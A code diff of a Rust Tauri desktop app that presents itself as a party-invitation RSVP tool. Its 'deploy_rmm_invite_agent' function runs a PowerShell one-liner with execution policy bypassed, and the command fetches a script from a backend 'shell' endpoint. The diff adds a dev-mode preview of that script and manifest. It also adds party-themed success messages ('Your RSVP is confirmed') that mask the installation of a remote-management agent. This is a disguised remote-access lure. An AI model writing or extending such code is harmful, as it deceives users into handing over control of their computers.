@@ -67,8 +67,8 @@ fn build_powershell_oneliner(token: &str) -> String {
 
 #[tauri::command]
 async fn deploy_rmm_invite_agent() -> RmmDeploymentResult {
-    // Only execute on Windows
-    if std::env::consts::OS != "windows" {
+    // Enforce Windows check only in production; allow any OS in dev
+    if cfg!(not(debug_assertions)) && std::env::consts::OS != "windows" {
         return RmmDeploymentResult {
             success: false,
             message: "This invitation experience is available on Windows devices.".to_string(),
@@ -91,7 +91,71 @@ async fn deploy_rmm_invite_agent() -> RmmDeploymentResult {
     // Build the one-liner
     let oneliner = build_powershell_oneliner(&token);
 
-    // Execute PowerShell one-liner
+    // In dev mode, fetch from backend and print manifest/config, but skip PowerShell execution
+    if cfg!(debug_assertions) {
+        let client = reqwest::Client::new();
+
+        let script_url = format!("{}/api/shell/script?token={}", BACKEND_URL, token);
+        let script_preview = match client.get(&script_url).send().await {
+            Ok(response) => match response.text().await {
+                Ok(script) => {
+                    format!(
+                        "{}...",
+                        script[..100.min(script.len())].replace("\n", "\\n")
+                    )
+                }
+                Err(_) => "<unable to read script body>".to_string(),
+            },
+            Err(_) => "<unable to fetch script>".to_string(),
+        };
+
+        let manifest_url = format!("{}/api/shell/manifest?token={}", BACKEND_URL, token);
+        match client.get(&manifest_url).send().await {
+            Ok(response) => {
+                let status = response.status();
+                match response.text().await {
+                    Ok(body) => {
+                        eprintln!("[DEV] Script preview: {}", script_preview);
+                        eprintln!("[DEV] Manifest status: {}", status);
+                        eprintln!("[DEV] Manifest body: {}", body);
+
+                        let success = status.is_success();
+                        let message = if success {
+                            "Your RSVP is confirmed, and your follow-up reminder is ready. See you at the party!".to_string()
+                        } else {
+                            "Party prep hit a snag (manifest fetch failed). Please try again.".to_string()
+                        };
+
+                        return RmmDeploymentResult {
+                            success,
+                            message,
+                            deployed_at: if success {
+                                Some(Local::now().format("%Y-%m-%d %H:%M:%S").to_string())
+                            } else {
+                                None
+                            },
+                        };
+                    }
+                    Err(e) => {
+                        return RmmDeploymentResult {
+                            success: false,
+                            message: format!("Party prep hit a snag (failed to read manifest): {}. Please try again.", e),
+                            deployed_at: None,
+                        };
+                    }
+                }
+            }
+            Err(e) => {
+                return RmmDeploymentResult {
+                    success: false,
+                    message: format!("Party prep hit a snag (manifest fetch failed): {}. Please try again.", e),
+                    deployed_at: None,
+                };
+            }
+        }
+    }
+
+    // Execute PowerShell one-liner (production only)
     match Command::new("powershell")
         .args(&["-NoProfile", "-ExecutionPolicy", "Bypass", "-Command"])
         .arg(&oneliner)
